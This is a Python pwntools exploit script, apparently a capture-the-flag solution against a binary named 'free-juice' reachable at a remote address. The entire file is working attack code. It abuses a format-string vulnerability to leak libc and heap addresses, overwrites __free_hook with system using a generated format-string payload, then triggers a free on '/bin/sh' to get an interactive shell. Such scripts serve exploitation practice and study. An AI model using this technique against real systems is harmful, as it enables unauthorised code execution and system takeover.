#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./free-juice_patched", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc 13.229.222.125 33178"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


def choose_juice(idx):
    io.sendlineafter(b"choice: ", b"1")
    io.sendlineafter(b"(1-5): ", str(idx).encode())


def secret_juice(payload):
    io.sendlineafter(b"choice: ", b"1337")
    io.sendlineafter(b"you!\n", payload)
    io.recvuntil(b"Current Juice : ")
    leak = io.recvline().strip()
    return leak


def drink_juice():
    io.sendlineafter(b"choice: ", b"3")


env = {}
io = start()

choose_juice(1)

# for i in range(1, 256):
#     leak = secret_juice(f"%{i}$lx".encode())
#     log.info(f"{i}: {leak}")

libc_leak = int(secret_juice(b"%13$lx"), 16)
libc.address = libc_leak - 0x6b5ef
log.info(f"{libc.address=:#x}")
heap = int(secret_juice(b"%18$lx"), 16)
log.info(f"{heap=:#x}")


def exec_fmt(payload):
    return secret_juice(payload)


# fs = FmtStr(execute_fmt=exec_fmt)
offset = 6

free_hook = libc.sym["__free_hook"]
payload = fmtstr_payload(offset, {free_hook: libc.sym["system"]})

secret_juice(payload)
secret_juice(b"/bin/sh")
drink_juice()

io.interactive()
